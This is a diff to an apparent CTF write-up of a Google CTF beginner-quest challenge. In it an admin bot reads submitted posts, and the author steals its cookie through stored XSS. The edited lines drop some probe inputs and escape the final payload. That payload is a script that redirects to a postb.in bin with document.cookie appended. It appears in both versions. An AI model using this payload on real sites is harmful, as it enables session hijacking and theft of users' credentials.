@@ -121,13 +121,11 @@ I have to say that, I really rake my brains out this task. People may find it ea
       > Your post was submitted for review. Administator will take a look shortly. 
   - Admin: this redirect you to '/admin', which post a 303 redirection that transfer back to the home page.
     ![home page](./images/GoogleCTF/beginner_quest/img6.png)
-1. Seeing that there is an input field, I already knows that there is something to do with either injection or XSS. I tried to input some trash into it, but sadly I dont see the response:
-    > "'(\(){}--
-    > <script>alert(666)</script>
-1. Here is where I stuck for long. I cannot see there is anything to temper with the inputfield. I left no way but to request help from the internet. And they gave me a breakthrough of telling me that there is actually an admin to 'Read' the post by browsing anything you put in the message (It suppose to be a ROBOT behind!!! NO ONE IS SUPPOSED TO READ THE THING I POSTED!!!). Anyway they also suggested the tool [postbin](postb.in) that I could use to receieve HTTP request
+1. Seeing that there is an input field, I already knows that there is something to do with either injection or XSS. I tried to input some trash into it, but sadly I dont see any response.
+1. Here is where I stuck for long. I cannot see there is anything to temper with the inputfield until someone in the internet gave me a breakthrough of telling me that there is actually an admin to 'Read' the post by browsing anything you put in the message (It suppose to be a ROBOT behind!!! NO ONE IS SUPPOSED TO READ THE THING I POSTED!!!). Anyway they also suggested the tool [postbin](postb.in) that I could use to receieve HTTP request
 from anywhere.
 1. Then things go really easy. I just tamper the XSS script and make the admin browse my site, only letting him give us one more little gift.
-    > <script>location.href="https://postb.in/XXXXXX?cookie="+document.cookie;</script>
+    > \<script\>location.href="https://postb.in/XXXXXX?cookie="+document.cookie;\</script\>
 1. and we check the bin, our gift from admin has arrived!
     > cookie: 
     > flag=CTF{XXXXXXXXXXXXXXXXXXX}; 
